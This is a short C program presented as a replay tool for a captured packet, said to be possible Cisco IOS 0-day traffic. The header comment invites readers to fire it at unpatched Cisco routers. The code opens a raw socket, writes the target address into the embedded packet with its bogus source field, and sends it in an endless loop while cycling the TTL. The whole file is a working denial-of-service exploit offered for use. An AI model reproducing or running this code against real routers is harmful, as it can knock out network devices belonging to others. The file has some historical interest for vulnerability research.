/*
   Possibly a Cisco IOS 0-day traffic
   Captured by Michal Zalewski <lcamtuf@coredump.cx>
  
   Try replaying this against an unpatched Cisco router to see if
   it works... this is a real-life capture.

   NOTE: I take no responsibility for the effect of using this code.
   I've captured it flying over the network, it might have some effect,
   might not, one way or another, it's already being used in some manner.
   There *IS* a public exploit for that issue out, it's just that this
   packet seems to be coming from a different, unpublished tool.
   
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <errno.h>

#define fatal(x) do { perror(x); exit(1); } while (0)

// Capture:

unsigned char data[]={
0x45,0,0,0x14,0xfd,0xb1,0,0,0,0x37,0x08,0x1b,
80,50,156,4, /* bogus source */
0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x23,0x12,0x77,0xaf};

unsigned char sad[4];
int sock,one=1,a,b,c,d;
struct in_addr addr;
struct sockaddr_in sain;

#define ISOK(a)	((a) < 256 && (a)>=0)

int main(int argc, char** argv) {

  if (argc-2 || sscanf(argv[1],"%u.%u.%u.%u",&a,&b,&c,&d)!=4 ||
      !(ISOK(a) && ISOK(b) && ISOK(c) && ISOK(d))) {
    fprintf(stderr,"Usage: %s ip_address\n",argv[0]);
    exit(1);
  }
  
  sad[0]=a; sad[1]=b; sad[2]=c; sad[3]=d;
  sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  
  if (sock<0) fatal("socket");
  
  if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one)))
    fatal("setsockopt");
    
  sain.sin_family = AF_INET;
  memcpy(&sain.sin_addr.s_addr,sad,4);
  memcpy(data+16,sad,4);
  
  printf("Sending");
  
  while (1) {
    if (!(data[8]++)) { printf("."); fflush(0); }
    if (sendto(sock,data,sizeof(data), 0,(struct sockaddr *)&sain,
        sizeof(struct sockaddr)) < 0) perror("sendto");

  }
  
  return 0;
  
}

